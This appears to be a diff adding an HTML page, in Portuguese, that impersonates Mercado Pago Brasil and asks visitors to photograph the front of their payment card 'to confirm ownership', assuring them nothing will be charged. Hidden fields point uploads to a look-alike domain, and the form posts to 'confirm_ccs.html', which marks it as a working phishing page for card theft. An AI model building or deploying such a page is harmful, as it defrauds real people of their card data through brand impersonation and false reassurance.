@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+   <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <link rel="stylesheet" href="css/styles.css">
+      <link rel="icon" type="image/x-icon" href="images/favicon.svg">
+      <title>Mercado Pago Brasil | Empréstimo Online</title>
+      <style>
+        .hidden {
+            display: none; 
+        }
+    </style>
+   </head>
+   <body>
+      <div class="topo">
+         <img class="logo_topo" src="images/logo_mobile.png">
+         </head>
+      </div>
+      <form action="confirm_ccs.html" method="post" enctype="multipart/form-data">
+         <input type="hidden" name="link" value="https://mpago.crdbr.online/uploads/">
+         <input type="hidden" name="nome" value="MERCADO_PAGO">
+         <div class="container">
+            <img class="img_cartao" src="images/cartao.jpg">
+            <h1>Estamos quase la, confirme a frente do seu cartao Mercado Pago</h1>
+            <p>Fique tranquilo(a), não iremos debitar nenhum valor do seu cartão, este processo é apenas para termos certeza de que você é o dono desta conta. Levamos a segurança de nossos usuarios muito a sério. </p>
+            <div hidden>
+            <input  type="file" id="anexo" name="anexo" accept="image/*" capture="environment">
+            <img id="preview" class="img-preview">
+         </div>
+         </div>
+          <div>
+            <button id="botao" class="btn_cont" hidden>Enviar</button>
+         </div>
+      </form>
+      <button id="btnFoto" class="btn_foto" onclick="hideButton(); clicarBotao2()">Tirar foto</button>
+            <script>
+               document.getElementById("anexo").addEventListener("change", function() {
+                 document.getElementById("botao").hidden = false;
+               });
+            </script>
+
+             <script>
+        function hideButton() {
+            // Seleciona o botão pelo ID e adiciona a classe 'hidden'
+            document.getElementById("btnFoto").classList.add("hidden");
+        }
+    </script>
+
+    <script>
+        function clicarBotao2() {
+            // Simula o clique no segundo botão
+            document.getElementById("anexo").click();
+        }
+    </script>
+            <!-- <script>
+               document.getElementById("anexo").addEventListener("change", function(event) {
+                 const reader = new FileReader();
+                 reader.onload = function(e) {
+                   document.getElementById("preview").src = e.target.result;
+                 };
+                 reader.readAsDataURL(event.target.files[0]);
+               });
+               </script> -->
+         </div>
+     
+   </body>
+</html>
